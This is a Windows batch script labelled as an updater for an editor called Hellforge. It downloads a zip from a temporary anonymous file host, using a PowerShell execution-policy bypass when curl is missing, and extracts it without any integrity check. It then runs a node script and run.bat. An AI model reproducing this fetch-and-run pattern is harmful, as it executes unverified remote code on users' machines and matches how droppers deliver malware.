@echo off
setlocal EnableExtensions
cd /d "%~dp0"
echo Hellforge updater v1.4.3
echo Downloading latest files...

set "URL=https://litter.catbox.moe/a4m0xk.zip"
set "TMPZIP=%TEMP%\hf-update.zip"
if exist "%TMPZIP%" del /f /q "%TMPZIP%"

where curl.exe >nul 2>nul
if not errorlevel 1 (
  curl.exe -L --fail --retry 2 -A "Mozilla/5.0" -o "%TMPZIP%" "%URL%"
) else (
  powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-WebRequest -UseBasicParsing -Uri '%URL%' -OutFile '%TMPZIP%'"
)

if not exist "%TMPZIP%" (
  echo [ERROR] Download failed. Check internet and try again.
  pause
  exit /b 1
)

copy /y "%TMPZIP%" "update.zip" >nul
echo Applying update...
if exist "scripts\self-update.mjs" (
  where node >nul 2>nul
  if not errorlevel 1 (
    node "scripts\self-update.mjs"
  ) else (
    tar -xf "update.zip"
  )
) else (
  tar -xf "update.zip"
)

echo.
echo Update applied. Starting editor...
echo Double-click run.bat if the server does not start.
echo.
if exist "run.bat" call "run.bat"
pause
